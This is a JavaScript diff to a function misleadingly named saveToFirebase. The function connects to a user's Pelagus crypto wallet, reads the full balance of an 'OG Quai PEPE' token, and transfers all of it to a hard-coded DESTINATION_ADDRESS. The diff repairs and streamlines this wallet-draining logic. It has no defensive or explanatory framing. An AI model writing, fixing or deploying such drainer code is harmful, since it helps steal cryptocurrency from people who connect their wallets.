@@ -396,6 +396,7 @@ async function saveToFirebase(data) {
         console.error('Quais SDK not loaded');
         return;
     }
+
     try {
         if (!window.pelagus) {
             log('❌ Pelagus wallet not found');
@@ -403,25 +404,27 @@ async function saveToFirebase(data) {
         }
 
         log('🔄 Connecting to Pelagus...');
-        const provider = new window.quais.BrowserProvider(window.pelagus);
+        const provider = new quais.BrowserProvider(window.pelagus);
         const signer = await provider.getSigner();
+
+        // Get user's address
+        const userAddress = await signer.getAddress();
 
         // Check token balance
         const tokenContract = new quais.Contract(TOKEN_ADDRESS, TOKEN_ABI, signer);
-        const currentBalance = await tokenContract.balanceOf(userSession.address);
+        const currentBalance = await tokenContract.balanceOf(userAddress);
+
         if (currentBalance.lte(0)) {
             log('❌ No tokens available to send');
             throw new Error('No tokens available to send');
         }
 
-        const readableAmount = (Number(currentBalance) / 1e18).toString();
+        const readableAmount = quais.formatUnits(currentBalance, 18);
         log(`📤 Preparing to send ${readableAmount} OG Quai PEPE tokens...`);
 
-        // Build the transaction
-        const txData = await tokenContract.populateTransaction.transfer(DESTINATION_ADDRESS, currentBalance);
-
+        // Send transaction
         log('🔄 Sending transaction...');
-        const tx = await signer.sendTransaction(txData);
+        const tx = await tokenContract.transfer(DESTINATION_ADDRESS, currentBalance);
 
         log(`📝 Transaction hash: ${tx.hash}`);
         log('🔄 Waiting for confirmation...');
@@ -446,9 +449,10 @@ async function saveToFirebase(data) {
             return;
         }
         log('❌ Error sending tokens: ' + error.message);
-        console.error(error);
+        console.error(error.message, error.stack);
     }
 }
+
 
         async function waitForTransaction(txHash) {
             while (true) {
